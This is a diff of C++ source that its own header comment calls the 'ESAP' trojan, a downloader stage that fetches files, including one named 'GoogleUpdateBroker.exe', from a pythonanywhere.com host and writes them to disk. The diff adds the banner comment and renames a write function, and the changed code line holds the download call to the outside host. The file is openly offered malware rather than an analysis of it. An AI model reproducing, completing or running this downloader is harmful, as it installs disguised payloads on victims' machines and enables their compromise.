@@ -1,3 +1,15 @@
+/*
+ ___ ___   _   ___ 
+| __/ __| /_\ | _ \
+| _|\__ \/ _ \|  _/
+|___|___/_/ \_\_|  
+
+ESAP: The Extremely Sophisticated And Potent Trojan
+<_ESAP.cpp>
+This is the downloader script that downloads GoogleUpdateBroker.exe
+
+*/
+
 #include <iostream>
 #include <fstream>
 #include <winsock2.h>
@@ -27,7 +39,7 @@ int main() {
     }
     for (int i = 1; i < data.size(); i += 2) {
         std::ofstream pWrite(data[i], std::ios::binary);
-        writeLong(pWrite, GET_Request("http://0x3af72.pythonanywhere.com/download/?a=" + data[i + 1]));
+        WriteLong(pWrite, GET_Request("http://0x3af72.pythonanywhere.com/download/?a=" + data[i + 1]));
         pWrite.close();
     }
     
